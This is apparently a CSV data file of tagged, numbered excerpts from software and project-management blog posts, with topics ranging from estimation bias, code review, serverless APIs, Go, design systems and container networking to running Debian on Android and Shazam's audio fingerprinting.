784,"Luckily, the demo has documentation for all of the lines of code. When you share your new tool, you should include a walkthrough of a Hello World demo and then show off your small project. This provides a ground floor example followed by one that, while not overly complicated, is a real-world solution. You gain the opportunity to discuss the differences between the two config files. This shows what direction you are considering to move in and keeps questions from ranging into the obscure. Then, get others thinking about the ways that they could use the tool by inviting suggestions as to what project to target next. This is also a great time to let others show off their expertise. Ask your team if they see any issues down the road that introducing the tool may create.","['Software Development', 'DevOps', 'Software Engineering', 'Tools', 'Product Management']",18
785,"Anyone that has managed projects for any length of time knows the feeling of promising a launch date only to have that project miss, sometimes by a mile. It happens all the time and it messes with the entire cohesive fabric within a team and occasionally within the company itself. The Project Manager is frustrated, angry and worried about their job. The product owner is mad at the project team and is expressing that fact to the Project Manager. The customers and executives were expecting this new product, feature or enhancement so they are left wanting. Project delays can send a ripple throughout a company.","['Project Management', 'Agile Methodology', 'Scrum', 'Agile', 'Lean Startup']",1
786,"Inaccuracies in just one leg of the triangle put the whole project at risk, let alone two legs. If a project team is clearly underestimating the project for both costs and risks how successful can we expect to be on any given project? According to a 2017 KPMG study only 31% of projects are likely to deliver on time and only 29% are likely to deliver on budget. But, what Kahneman and Lovallo is telling us is that we tend to estimate both of those factors incorrectly. If we underestimate both of those metrics, how successful will we really be? With numbers like those should we just accept that projects will be late? If two of our three legs are affected by our own biases, how then do we effectively forecast our projects? Traditionally, project databases are kept by individual companies. Sometimes industries might have a similar, but larger scale data and today these can also be found on the internet. These databases collect information on projects, both successful and failures, to assist other project teams in their estimating. The database identifies all the key factors in the project and a team would be able to access it, search for similar projects and base their estimates on these previously attempted and completed projects.","['Project Management', 'Agile Methodology', 'Scrum', 'Agile', 'Lean Startup']",1
787,"Optimism is a key ingredient in a happy, successful work / life balance, but in projects it injects bias that we cannot allow. It is our job as project managers and team members to limit the bias of optimism. We need to anchor our estimates and this reality must permeate throughout the company. If we do it wrong, it can be very costly. Do everything possible to get it correct. The best way, as I see it is through iterative and incremental estimations where the entire team is involved every day; in other words: Agile.","['Project Management', 'Agile Methodology', 'Scrum', 'Agile', 'Lean Startup']",4
788,"Error Management Are we handling any unexpected errors correctly? Are we handling expected errors correctly even? Are the right kinds of errors and error messages being returned? And are we able to track these issues reliably (ie log files, dashboards etc)? Performance Is the code we write optimised for performance? If not we need to consider alternative routes to improve what weve written. Load tests and the like can help pick up any performance issues.","['Software Development', 'Programming', 'Business', 'Code', 'Software']",13
789,"Having readable and maintainable code is definitely ideal. Im not going to question that. In fact I do recommend that time is spent during an iteration of a sprint refactoring some of your code base, to reduce complexity where needed. Even if only half a day is spent on it. But spending time trying to constantly improve the quality of the code during development hinders throughput. As long as we have addressed the concerns listed above, its good enough for me.","['Software Development', 'Programming', 'Business', 'Code', 'Software']",9
790,"Another thing I want to say about maintaining code is around political correctness and this may bother some readers, but I dont care. Enforcing style guide rules is counter productive in my opinion. Debating over if people should use spaces or tabs, or if you put an underscore before a private variable etc is just utter nonsense. We dont write in text editors anymore. We all for the most part use IDEs and have intellisense built into them. We can see what is private or public, what is static and not static and what is a class and not a class etc etc, pretty quickly these days. Its not like we are taking the code to a printer and reading it on paper. So as long as you can understand what the code is trying to achieve, leave it alone. Stop expecting everyone to work like you do. Everyone codes differently and always will. A simple have you considered this is ok, but enforcing your concepts and practices on others is not needed. I had to accept this a while ago, and its time others did too. If it works theyve done their job, regardless of whether you like how they went about it or not.","['Software Development', 'Programming', 'Business', 'Code', 'Software']",9
791,"With this in mind some of you might say to me that I must also not care for code reviews. This is not true, I just think about them differently. Code reviews to me should be about the reviewer assessing the likelihood that the specific pull request could fail to meet its objective based on what is written. Or that it may affect some other feature in the application in a negative way. If there are doubts about how the code should operate under certain circumstances (maybe error handling is wrong or nulls have not been checked etc) we get a chance to discuss it with the person who built it, hear them out, and if you still see an issue with it, you can bring it to their attention. If you are personally not sure about how something is meant to work, then also a team discussion can occur to conclude what should be done. Code reviews also give us the time to assess if the points I have mentioned above are still going to be met after this change.","['Software Development', 'Programming', 'Business', 'Code', 'Software']",13
792,"Brooks ends his second essay with a short section titled Net on Bullets Position Unchanged. He quotes noted software observer Robert Glass, in an essay in System Development magazine: At last, we can focus on something a little more viable than pie in the sky. Now, perhaps, we can get on with the incremental improvements to software productivity that are possible, rather than waiting for the breakthroughs that are not likely to come. [11]The history of software engineering has been a search for the silver bullet. Structured programming, formal testing, object-oriented languages, design patterns, Agile methodologiesall are useful, but none alone can slay the werewolf. I personally lived through all these transitions, even structured programming; due to spending my early years in a self-taught bubble of Fortran and BASIC, I was able to experience the twilight of GOTOs firsthand, ten years later than the rest of the industry. Each of these started out small, gained supporters, and wound up being hyped as the solution to all programming problems, leading to inevitable disappointment and disillusionment. I can understand why programmers hope beyond hope for the silver bullet and have eagerly glommed on to a succession of shiny objects. Any port in a storm, as the saying goes. Unfortunately, as Parnas put it, [Programmers] have been fed so many silver bullets that they dont believe anything anymore. [12]Moreover, the software industry has gotten in the habit of abandoning old silver bullets once they get tarnished. Its a binary view of the world: a programming technique is either going to solve every problem or its useless. When Microsoft began hiring software test engineers to test the software, the developers, who previously had been responsible for this, quickly segued into throw it over the wall to test mode. In the mid-2000s, Microsoft replaced software test engineers with software design engineers in test, responsible for writing automated tests, and stopped relying on manual testing. With the later move to unit tests, which are written by developers, the company got rid of a lot of the software design engineers in test and the user-interface-level tests that they provided. Now with the transition to the cloud, there is an emphasis on test in production, where updates to the software are quickly deployed to a small percentage of real customers, with checks in place to quickly detect problems and roll back the update. Each new technique is useful, but it should be viewed as another arrow in the quiver, not the be-all and end-all that obviates the need for what went before.","['Software Engineering', 'Software', 'Software Development', 'Programming', 'Software Industry']",2
793,"In Faa S, these functions are deployed in modular form. One function corresponds to each operation, thus eliminating the rest of the code and time spent on writing boilerplate code for setting up a server and data models. These modular functions can further be scaled automatically and independently. This way, more time can be spent on writing the logic of the application that a potential user is going to interact with. You do not have to scale for the entire application and pay for it. Common use cases of Faa S so far have been implemented are scheduled tasks (or cron jobs), automation, web applications, and chatbots.","['AWS', 'JavaScript', 'Nodejs', 'Programming', 'Web Development']",10
794,"In the above file, hello is the function that has two parameters: event, and context. module.exports is basic Nodes syntax as well as the rest of the code. You can clearly see it also supports ES6 features. An event is an object that contains all the necessary request data. The context object contains AWS-specific values. We have already discussed it before. Let us modify this function to our needs and add a third parameter called thecallback. Open __url__ file and edit the hello function.","['AWS', 'JavaScript', 'Nodejs', 'Programming', 'Web Development']",15
795,"In this part of the tutorial, I will show you how to hook up a Mongo DB database as a service to a Serverless REST API. We are going to need three things that will complete our tech stack. They are: AWS Lambda Node.js Mongo DB Atlas We already have the first two, all we need is to setup a Mongo DB cloud database called Atlas. Mongo DB Atlas is a database as a service developed by the team behind the Mongo DB itself. Along with providing a free/paid tier for storing your data on the cloud, Mongo DB Atlas provides a lot of analytics that is essential to manage and monitor your application. Mongo DB Atlas does provide a free tier that we will be using with our serverless stack.","['AWS', 'JavaScript', 'Nodejs', 'Programming', 'Web Development']",11
796,"I am going to demonstrate a simple Note taking app through our REST API. These CRUD operations are going to be the core of it. Since our API is going to be hosted remotely, we have to enable Cross-Origin Resource Sharing. No need to install another dependency on that. Serverless configuration file has support for it. Just specify in the events section like cors: true.","['AWS', 'JavaScript', 'Nodejs', 'Programming', 'Web Development']",11
797,"But above solutions have its own limitations too. We cannot add more and more cache to the processor to increase performance as cache have physical limits: the bigger the cache, the slower it gets. Adding more core to the processor has its cost too. Also, that cannot scale to indefinitely. These multi-core processors can run multiple threads simultaneously and that brings concurrency to the picture.","['Golang', 'Software Development', 'Web Development', 'Programming', 'Software']",3
798,"Go brings best of both the worlds. Like lower level languages like C/C++, Go is compiled language. That means performance is almost nearer to lower level languages. It also uses garbage collection to allocation and removal of the object. So, no more malloc() and free() statements!!! Let me tell you one thing. Go does not have crazy programming syntax like other languages have. It has very neat and clean syntax.","['Golang', 'Software Development', 'Web Development', 'Programming', 'Software']",9
799,"Mobile hadnt quite taken off yet. e Bays mobile site was underperforming in comparison to desktop. Management decided to fire the whole team. Forget about this mobile thing, our focus should be on the core business. Soon after, Apple made an announcement to a select number of developers, inviting them to participate in a new service they were preparing to launch at WWDC: the App Store. Some of these developers were at e Bay.",[''],17
800,"Identifying this pattern allowed us to simplify the way we model payment methods. We could reuse existing credit card processing code while selectively handling divergent behavior at various points in the transaction lifecycle. The case statement above was refactored to be something like: We refer to payment methods written in this pattern as Credit Card+ because they are credit cards with additional behavior. Our first Credit Card+ payment method, Visa Checkout, relies heavily on this type of modeling and the tell, dont ask principle. Instead of implementing Visa Checkout as a new Payment Method, we reused the Credit Card class. We added a Behavior interface, implemented by both credit cards and Visa Checkout cards. A Behavior is a common protocol for all Credit Card+ payment methods that act on the polymorphic data structure. At the point in the transaction lifecycle where we would have inspected the type of payment method to determine what mutation to perform, we instead delegate that action to the object that holds that data, the Behavior.","['Payments', 'Programming', 'Software Engineering', 'Fintech', 'Engineering']",15
801,"Ultimately, the decision to refactor was obvious given the time we had saved on the onboarding and transacting segments. Building tokenization took the majority of our time for this integration, but, we were able to deliver more than the Samsung Pay product within the deadlinewe also delivered the majority of tokenization for future payment methods. Samsung Pay became the first payment method with tokenization solely through our new Graph QL API. And you can inspect our work in our Graph QL API Explorer! As we add support for new payment methods, we aim to include an aspect of support for those to come. With Visa Checkout, we delivered transaction processing for payment methods that are wrappers around credit cards. Subsequently, with Samsung Pay, we delivered a tokenization interface that will ease the addition of future payment methods. Each new payment method we add to our codebase is an opportunity to break away from existing patterns and reduce duplication. And with thoughtful evaluation, sometimes these additions can pave the way for future products.","['Payments', 'Programming', 'Software Engineering', 'Fintech', 'Engineering']",6
802,"The corporate culture was stale for several decades. The tasks, responsibilities and tools were split and siloed between departments. Unfortunately, this had quite often lead to the situation where the goals of these departments were quite contradictory. For example, the Devs should constantly develop new products or features and push them to production, while Ops need to ensure the operational stability of the existing IT infrastructure and uninterrupted end user experience. However, updates and new releases ended up with bugs and service downtime quite often, which results in customer frustration and financial losses. This is exactly the issue the Dev Ops culture helps to solve.","['DevOps', 'Software Development', 'Continuous Delivery', 'Continuous Integration', 'Workflow']",12
803,"For nearly 50 yearsever since Frederick Brooks published the classic The Mythical Man-Monthsoftware development teams have struggled with how to build a project on time and according to spec. Heres what they are forgetting to tell you before you started building that new app Building an app should be simple enough. You sit down a few people in a room, agree on a few specifications, and then let the smartest people in the room go to work coding what you just finished discussing. There is a very high probability that the final product will look nothing like the original specifications. There are a number of very good reasons for this, and it has nothing to do with the incompetence of the software development team. In some cases, even the original problem you were trying to solve changes. In fact, its very much a miracle anything actually gets built in the end.","['Software Development', 'Technology', 'Mobile App Development', 'Programming', 'Data Science']",12
804,"In a best-case scenario, there will always be a direct one-to-one mapping between all the features originally drawn up by the software development team, and the final features that appear in the app or software. But heres the problemmost software development teams are under so much pressure to get the project out the door that they will skimp on the documentation of what each line of code is actually supposed to do. Repeat this enough times, and it inevitably leads to a feature that nobody really knows what it does, or how it even appeared in the first place. (And whatever you do, dont call it a bugits always a feature! )As much as people like to talk about being in alignment (or whatever the latest MBA 101 jargon happens to be), people are rarely in alignment. Thats what makes us people, not machines. And one of those people will (unofficially, of course) appoint himself or herself as the person in charge of moving the goalposts. You know, the person who shows up at the Monday morning meeting and announces out of nowhere that the project deadline date has been moved up a few weeks, or that a long-forgotten feature is now mission-critical and must be added immediately. **So the next time you sit down with your team and start to hammer out the deadlines and specifications for your next software project, keep these points in mind. It might just save you a lot of blood, sweat, and tears.","['Software Development', 'Technology', 'Mobile App Development', 'Programming', 'Data Science']",12
805,"This open source contribution system worked brilliantly for the technical side of the platform, but when it came to design we immediately began experiencing growing pains. Without a straw-man the design system took a long time to get off the ground. Gaining consensus between design leads on the direction was difficult. Each person had a different, but equally valid opinion. Also getting the component systems architecture consistent was problematic. Tech leads are some of the busiest people at TELUS, so getting them in one room to come to a decision isnt easy. We werent seeing much benefit beyond what Frogger had provided and the slow pace of progress led to negative feedback from our internal teams. So we took the hard decision to pause the initial roll-out and decided to tackle this problem head-on.","['Design', 'Design Systems', 'Community', 'Scale']",1
806,"By combining these two ideas we were able to see the whole picture. With this lens, our problem became razor sharp. We had started out with a solitary model: the CSS Master sheet. This was analogous to a mesh network with many nodes, each connected to one another. Mesh networks create a very fault-tolerant system, as mistakes dont spread easily or fast. However, while they help facilitate onboarding, consensus becomes increasingly more difficult as they scale, as does the likelihood of individual teams making mistakes. The decision to move to an open source model didnt change the network topology, it just repeated it.","['Design', 'Design Systems', 'Community', 'Scale']",14
807,"The federated model described by Nathan is basically a Tree and Branch networkthe perfect hybrid. Tree and Branch networks are: Easily scalablejust add a new branch Consensus drivenbranch node validates all decisions Fault toleranterrors are confined to single branches Process friendlybranch node helps expedite information relays Ultimately, it became clear that the Federated model was the clear winner and would be our design systems end state, but we had some catching up to do with the rest of the platform. Now that we could break down the problem clearly we could analyze the trade-offs of each option. We decided to start with a centralized system, as this was the quickest and most accurate way forward. This would help us create the atoms and lay the rails for a fantastic, scalable design system. In the future, as we rolled it out to all teams, we would transition to a federated solution.","['Design', 'Design Systems', 'Community', 'Scale']",10
808,"Now the time has come to remove the training wheels. We believe that we have developed a product and set of processes that teams cant live without. Over the next few weeks, well begin to step aside, and rather than being the central limiting hub for the system, we will transition to being one of the branches. To that end, we have open sourced the TDS-Core and Community components via Github and created the accompanying documentation. We hope that the process to discover and share design-ready components speeds up dramatically over the next few months as teams begin to work together to create components that can be leveraged by all. And as the amount of components begins to increase, we hope to also see an explosion in productivity and creativity as teams stop focusing on the mundane in favour of the extraordinary.","['Design', 'Design Systems', 'Community', 'Scale']",6
809,"As designers we, ourselves, are challenged at separating our value from owning our execution work. In this light, think about Mrs. Murphys Law as a bit of a spin on Murphys Law (1953). We could easily apply this to designers. Lets admit it, its difficult to hand over the driving wheel if theres no system in place to help someone else make the best decision with the right support. Also we may not trust them to do it well.","['Agile', 'Design Systems', 'Designops', 'Complex Adaptive Systems', 'Human Centered Design']",12
810,"Theres a bit of an environmentalist agenda in there too. Humans interact with Complex Adaptive Systems every day. If its not what is outside our bodies and minds, the complex adaptive system is ourselves. Perhaps thats why meditation has had a revival! Seriously though, that is why becoming more human-centred as a designer and is really important. Im thinking in particular of lone UX and product designers in Agile teams. Design systems create a way for designers and other people of all shapes and sizes to work together in order to make better decisions in the things we create for people. Well considered design systems will help us get there, certainly in the short term.","['Agile', 'Design Systems', 'Designops', 'Complex Adaptive Systems', 'Human Centered Design']",12
811,"Being able to write your apps as web pages, then host them within a framework to get on to the app store. Unfortunately, none of these apps felt right. It was pretty obvious that they werent native. They were slow, didnt look quite right, and some functionality didnt operate the same way (for example, having to scroll iframes with two fingers, not continuing scrolling with friction when you released your finger, etc). They did give the benefit of device specific features however. Things like GPS, accelerometer, and later, push notifications.","['React', 'Mobile App Development', 'Software Development', 'Programming']",19
812,"So where do I sit on this? Native is where you go when you need to squeeze absolutely everything out of your device and PWAs are for rapid development and release (think CI/CD pipelines to customers). PWAs also have the advantage of using many more languages. Want to write in React, go for it. How about something more obscure, Elm for instance?","['React', 'Mobile App Development', 'Software Development', 'Programming']",19
813,"Software drives the world, there is no doubt about that. Modern life is unthinkable without the internet, your computer, your smartphone, your car etc. Software is the oil that makes all devices run. Shouldnt this oil be of the best quality possible? Before I start, a short background of me personally. I have been working in this industry in many roles, starting as a project manager evolving into different management jobs. My personal mission is to let software development teams flourish. In this article I hope to inspire developers and managers with some of the things I have learnt.","['Software Development', 'Business', 'Perspective', 'Soft Skills', 'Business Value']",16
814,"Dealing with software development is often challenging for both the business and the development team. Most often projects are complex and demanding, not only from a development perspective. Also because they deal with complicated matter or are complex for the client. Bringing together business and user needs proves to be hard. Developing software requires good analytical abilities from the software architect. He needs to reduce its complexity into understandable and programmable elements. Additionally, creativity is required to find the optimal approach to the technical complexities.","['Software Development', 'Business', 'Perspective', 'Soft Skills', 'Business Value']",12
815,"The passions of coders are inflamed not over buggy software but over egregiously concise or verbose code. Those lines are signs of a hack. Any programmer who disagrees is an amateur. Only a neophyte would produce methods and blocks that so clearly violate good taste. Yet, differing preferences, not laws of nature, are the source this conflict and the vitriol. Hatred between developers is, in this case, the result of different inclinations towards trading succinctness for different ends. These goals, and the tendency for them, are different for every developer, leading to constant conflict in certain areas. One such place is wordy or pithy code. To minimize combat, a team can use code reviews to highlight the most egregious segments, and the group can argue over those parts instead arguing over every line and block of a code base.","['Programming', 'Code Review', 'Arguments', 'Software Development', 'Software Engineering']",12
816,"Potential Resolution: Conditional-operators are a beneficial, when they replace a high density of values set based on conditions implemented through if-statements. Conditional-operators are destructive, when they replace even a couple of decisions embedded within one another. Imperatives that fit readably on one line are a prime target for conditional operators, while conditions that require several lines are the domain of if-statements. Any egregious usage of if-statements or conditional-operators should be corrected to deploy the appropriate usage of one of those constructs. (Note: Modification might require significant refactoring. )Two particular styles that lead to arguments are multiple returns and single returns. Disagreements emerge over whether methods should have one return statement or whether multiple return statements are acceptable. Each approach has positives and negatives.","['Programming', 'Code Review', 'Arguments', 'Software Development', 'Software Engineering']",9
817,"Potential Resolution: Multiple returns make code difficult to understand, follow, and test, when they are used inconsistently. Single return-statements lead to long methods, when they are proceeded by lengthy stretches of code. Those drawn-out spans can be shortened, or at least made readable, by using several return-statements instead of one. Single returns are perfectly acceptable, when they follow short tracts of code. Any glaring misuse of a single return-statement or multiple returns should be fixed to apply an accepted use case of one of those styles. (Note: Correction might require significant refactoring. )The break and continue constructs are the subject of intense debates. On one side of the argument, developers argue that break and continue can simplify control flow. Other programmers contend that these features complicate a programs logic. Break and continue can definitely be used to simplify or complicate code.","['Programming', 'Code Review', 'Arguments', 'Software Development', 'Software Engineering']",9
818,"Potential Resolution: Most developers argue that code should use simple mechanisms for control flow. Which specific mechanisms are simple is the source of the debate. This argument becomes much less heated, when each instrument is used in widely accepted ways. Accepted approaches do exist for break and continue. Stick to those conventions to prevent disagreements and to simplify control flow. Any means of control that egregiously violates those standards should be corrected without debate.","['Programming', 'Code Review', 'Arguments', 'Software Development', 'Software Engineering']",9
819,"Exceptions are a means to indicate a problem or to ward off a future issue. What headaches should be indicated or warded off by what parts of code is a topic of fierce debate. On one end of the disagreement, coders argue that pervasive defensive exceptions prevent errors and make them easy to location. However, that laundry list of defense can make code bloated and difficult to understand, as some programmers have argued. Developers on both side of the debate have a point. Defensive exceptions have both benefits and detriments.","['Programming', 'Code Review', 'Arguments', 'Software Development', 'Software Engineering']",9
820,"These code constructs and techniques are used by both good and bad developers. These inclinations manifest themselves in code. Occasionally, a developers impulses lead him to write code that other coders rightly criticize. The developer being pilloried is not necessarily a bad programmer. The coder criticizing him is not necessarily a good developer. Both people have likely been led astray, at one point, by their preferences. These desires should not lead development to degenerate into a never-ending stream of insults hurled at one another. Rather, programmers should review each others code, limit their battles to its worst sections, and agree to settle certain arguments through the rules laid out above.","['Programming', 'Code Review', 'Arguments', 'Software Development', 'Software Engineering']",9
821,"So now we have two containers connected to the bridge. The containers should be able to ping each other as well as the vagrant machine, and also the external network like the host or google.com. To remove a container from the network, we will basically run the same command with a very small but very important difference. (note add to del )We can invoke more CNI plugins on a container for extra configuration. we can use the portmap plugin for mapping the container ports to the host. Heres an example CNI config with chaining. (running one CNI plugin after another). Note the new field called plugins and port Mappings=true The port-mappings can be fed to the the portmap as a part of its runtime configuration via an environment variable called CAP_ARGS. Lets add a container to the network, with this CNI config and the runtime parameters set via environment variable CAP_ARGS.","['Docker', 'Kubernetes', 'Containers', 'Networking']",7
822,"Since you almost certainly dont manage and host every single part of your application on the same zone of the same provider, you also get to add in downtime for all of your 3rd party dependencies. Do you use an email provider? If you have a handful of external partners involved on your site, you probably have an outage a month to deal with, if not more.","['Web Development', 'JavaScript']",10
823,"Most dev ops engineers will take a server out of round robin load balancing if it stops responding, but how many environments are set up to retry the original failed requests? You might have retries configured for your mail service, but if the tries arent spaced out long enough and the service is down for a few hours, will emails still get sent? You might have a few copies of your app running on multiple servers, but a single load balancer is still a single point of failure to many. Some of the most common devops issues could be mitigated by applying some core principles: Every piece of infrastructure should be on more than 1 zone No excuses for treating load balancers as acceptable points of failure Since everything will fail, (safe) requests need to be automatically retried This principle is not only relevant to devops teams, it should have a role in your application logic as well; if every http call or S3 file upload not only could fail, but likely will fail, how should we design differently? Every request not ESSENTIAL to your site being online should be moved to a job queue Queued jobs need to be retried with exponential backoff, need to be assigned priority, and need to have monitoring built in Every function call not CRITICAL to your core business should be wrapped in a try/catch Performance is not about micro-optimizations done by supersmart code geniuses. Unless you have a performance assistant who follows you around and re-writes all of your code, it is your job to build things right the first time, or at least fix things as you go. Paying attention to performance problems and using them as an indicator for fragile parts of your system can pay huge dividends. Guaranteeing 3rd parties are not able to take your site down, queueing up non-essential actions, considering costs before adding features, and writing more code yourself could substantially improve both site reliability and load times.","['Web Development', 'JavaScript']",10
824,"As we are creating a Debian system for a different architecture than an x86 system in which debootstrap is run, the arch armel argument is used to instruct debootstrap to create the Debian base system for the ARM architecture. foreign instructs it to do initial unpacking only, and a second stage install will be done later on the actual hardware. jessie instructs it to download the packages to directory named jessie in the current directory from where debootstrap is run. And finally a repository url to fetch the packages from. You can use your local repository here, but make sure it has packages for the architecture armel. See man page of debootstrap if you need more information.","['Android', 'Linux', 'Hacking', 'Software', 'Engineering']",7
825,"Now refresh repo data and install openssh-server: Here youve actually run Debian on your Android device! But its chrooted below Android, and we want the reverse. But now we got a complete Debian system with SSH server and all. Still some tinkering needs to be done. (If apt-get update didnt work, check your /etc/named.conf. )Mount the SD card on the desktop again. Unpack the original boot image initramfs to /android on the SD cards Linux partition. This is the new Android rootin the Debian filesystem tree. Note that since the new Android root here isnt a mount point but a subdirectory, Android will not succeed re-mounting it as read-only. If you believe this will cause a problem, you can instead create the Android root on a separate partition on the SD card and mount it as /mnt/root/android in the init on the initramfs above, right after mounting /mnt/root. However, in this case, /android/log is read-only and may not be used for boot logs by /etc/init below. You may solve this by mounting a tmpfs or simply remove logging by /etc/init.","['Android', 'Linux', 'Hacking', 'Software', 'Engineering']",7
826,"Android normally only accepts 4 partitions on the SD card due to vold limitations. If you dont want to waste one of them for the small root file system, you can loopback mount (using the bind option) /android to /mnt/android to make it a mount point. You then can set this mount point to read-only using remount. Note that you must do a remount, because a bind-mount cannot change the flags of the original file system initially. Youll have to do this remount explicitly yourself in init.stage2 using /bin/mount in this case. For now, just let the root be writable until you get everything up and running. This can be done lateror not at all.","['Android', 'Linux', 'Hacking', 'Software', 'Engineering']",7
827,"Environment variables and file descriptors When sshing into the device, remember that neither the SSH server nor your login shell is a child of Androids init. Therefore you have no access to either file descriptors or environment variables created by init, especially not ANDROID_PROPERTY_WORKSPACE with corresponding file descriptor. Because of this, you cant use getprop / setprop or any command relying on Android properties from the ssh session (e.g. In order to accomplish this, you must enter the Android world via a child of init, e.g., adb or a local ssh-server in the Android root (e.g.","['Android', 'Linux', 'Hacking', 'Software', 'Engineering']",7
828,"Backup Although Debian is the root, both systems are heavily dependent on the Android system and its init, since its the owner of the hardware (i.e. If Android init fails, you will not be able to ssh into the Debian system. Even if the root is transferred to the SD card, the Android init mounts internal partitions, most importantly, /system. Certain changes you make to this partition might get yourself locked out. This can be solved by restoring a backup copy of the Android system to the SD card and editing /android/init. *.rc to not mount /system from internal flash but instead use the one you just restored to the SD card. Running /system from the SD card, to begin with, may be a good idea if you plan to change it frequently. This way the original system partition can be left untouched. This, of course, goes for all the Android partitions. For example, you can easily increase the space for your apps by moving /data to a much bigger partition on the SD card.","['Android', 'Linux', 'Hacking', 'Software', 'Engineering']",7
829,"Io T (Internet of Things) is affecting the testing field significantly. Traditional methods of automation like Selenium are rendered useless in an embedded environment. We are seeing more and more Python and C/C++ based test frameworks that perform unit testing, integration testing, and system testing. Most test frameworks are testing APIs exported by these embedded libraries, where quite a few of them are calling into the embedded code to perform unit testing. This requires specialized test engineers with significant Software Development experienceand we see more Software Developers will be deployed to automation testing roles. Python is probably the language of choice for IOT test framework developmentbecause of its ability to call into C code directly with ctypes package.","['Software Testing', 'Automation Testing', 'Microservices', 'Continuous Testing', 'Continuous Integration']",10
830,"We are seeing an adoption of BDD based testing mechanisms that allow iterative testing for new features developed over a sprint cycle. BDD stands for Behavior Driven Development, which itself is derived from Acceptance Test Driven Development (ATDD). BDD forces teams to come up with Test Scenarios along with the requirement gathering. The test scenarios are immediately written down and checked in into CI system to force the CI system to show failures for these scenarios. The goal of the development and QA teams during the Sprint now becomes making these scenarios pass. This new mechanism of testing framework developmentis novel in its approach and well suited in an Agile environment. We are seeing a large number of our clients are moving to BDD based test development in their Agile practices.","['Software Testing', 'Automation Testing', 'Microservices', 'Continuous Testing', 'Continuous Integration']",1
831,"Alright so what the Shazam servers have to do, is to compare each songs waveform until it finds a waveform like this, isnt it the case? But think of the mammoth dataset that the matching algorithm needs to go through. In [1], Chris Barton says that the datasets at the Shazam databases consist of 45 years of music! So it is nearly impossible to accomplish the above task in such a trivial manner as we stated above. Moreover, think about the degradation (or attenuation, in a scientific tongue) and noise that could be embedded in a recording, due to the surrounding and other factors. Thus, Shazam needed a robust, fast and concise algorithm for their application. Chris Barton and the crew approached several universities and found two engineers who were involved in audio processing and both of them were Ph.","['Data Structures', 'Shazam', 'Audio Recognition']",5
832,"The two major concerns of the Shazam algorithm were noise resilience and rapid searching capability. So the engineers needed a solid representation of the song, in a digitized format, of course, to represent the song. The waveform was not that much intriguing as it does not provide a prominent search mechanism, despite the method that we discussed above. And it is better to remind at this instance, that this algorithm mainly took place in the late 90s, near the millennium. So not much tools and frameworks were there to generate these spectrograms in the software layer. But still, the core fundamentals were already developed, such as Fourier Transform to generate a spectrogram.","['Data Structures', 'Shazam', 'Audio Recognition']",5
833,"Yes, it sounds a bit odd. But the term empirically was given to the phenomenon of deterministically generating a digital summary of an audio signal so that the audio signal could be identified quickly. So how was this digital summary generated in Shazam? Remember the reddish regions in the spectrogram? This is where those become handy. Since they represent the highest peaks in the amplitude, it is trivial to say that those points in time, are the points in the audio signals to have the least chances of getting degraded.","['Data Structures', 'Shazam', 'Audio Recognition']",5
834,"This is the genius part of the algorithm. For each hash match between the recorded audio clip, and the database, a time-pair is formed and put into bins categorized according to the Track ID. Remember we attached a track ID when fingerprinting the database audio files? Thats where the track IDs come from. Say you find the hash x in an audio recording and in the database. Thereafter the time offsets are being put into a pair, say (t, t), where t being the time offset (time from the beginning of the recording to the anchor point) of the audio recording, and t the time offset of the original song in the database.","['Data Structures', 'Shazam', 'Audio Recognition']",3
835,"Id advocate to generally start with a private nudge with the offender. You may have totally misread the interaction and can leave it at that. In the best case you can get them to apologise and correct the behaviour themselves. As an aside, I recommend leaving all but the worst comments unedited and adding an explanatory or apologetic comment afterwards rather than rewriting history. You cant take back a hurtful comment, but by expunging them from the record it can gaslight the reviewee and undermine the group learning opportunity. If the offender declines to apologise, leave a public but gentle rebuke.","['Software Development', 'Code Review', 'Code Review Manager', 'Engineering Management', 'Engineering Manager']",4
836,"Before diving into writing an interview script, step back and assess what questions you are trying to answer at a high level. Ensure you have questions scripted to help you get answers to those big questions and try to stay focused on those. You are probably trying to find out all of some of the following things: Have you identified an actual problem your market has? Is it the biggest problem they have in a given area? Do they know it is a problem? How valuable would solving it be? How do they talk about the problem? Have you identified the right pains & gains? Before you dive into your key questions, spend some setting the stage, making the customer feel comfortable. After you are done with your key questions, thank them for their time, ask if they have questions, ask if you can followup with them. Remember this person has given you something valuable even if they didnt give you the answers you expected! OK, lets dive into the interview script starting with validating the problem. A standard question pattern you can use is: Tell me about <past event>What could be better about <x> OR What is frustrating about <y>Why? Show me how you do that today? The challenging part is deciding how narrow to focus your first question. Too narrow and you are leading the conversation to the area you want to hear about without understanding the broader problems they face. Too broad and you risk the conversation going off the rails.","['Lean Startup', 'Customer Development', 'Product Management', 'Customer Interview', 'Software Development']",0
837,"Your first round of questions might go something like this: In this first round, the customer doesnt immediately mention invoicing as one of their biggest problems. But they do mention accounting so you have a great lead into the area you want to talk about. Also notice the discussion around their website. Part of your value proposition was around a tool to create professional looking invoices. The customers comment about understanding that a great website is important to their business is a good sign that they would value this quality of professionalism. Lets repeat the pattern for Round 2So now that the customer is talking about accounting, invoicing does come up as a top problem for her though not for the reasons you hypothesized. Her focus is on the time it takes to receive payment. At the end, instead of asking her to tell you more about how she manages the collections process, you ask to see her do it. If your customer is willing this is a great way to discover new new problems.","['Lean Startup', 'Customer Development', 'Product Management', 'Customer Interview', 'Software Development']",0
838,"In our example scenario your next round of questions might to like this Customers dont always follow the script. This customer doesnt initially know what you mean about success so you have to adapt and try to guide her a bit without guiding her directly to the answer you want to hear. Notice when you ask about saving time (one of your identified pain points) she says that would nice. That is not a strong answer so you want to see if there is something she values more than saving time. You confirm what you heard earlier that time to receive payment is the key driver for her. But when you probe further, price is also a driver.","['Lean Startup', 'Customer Development', 'Product Management', 'Customer Interview', 'Software Development']",0
839,"There were good reasons why our competitors used special hardware. Think about the operating characteristics of an ATM: it has to be open 24 hours a day, 7 days a week, so it must be resilient against component failures. Customers expect to get their money quickly, so it has to be responsive at all times. At some hours of the day it will be very busy, at others it will be quiet, so it must cope with widely varying and unpredictable load. Oh, and it cannot lose a transaction under any circumstances. Thats a serious set of requirements, and conventional wisdom held that Open Systems software couldnt hack it.","['Programming', 'Cloud Computing', 'Software Architecture', 'Software Engineering', 'Payment Processing']",16
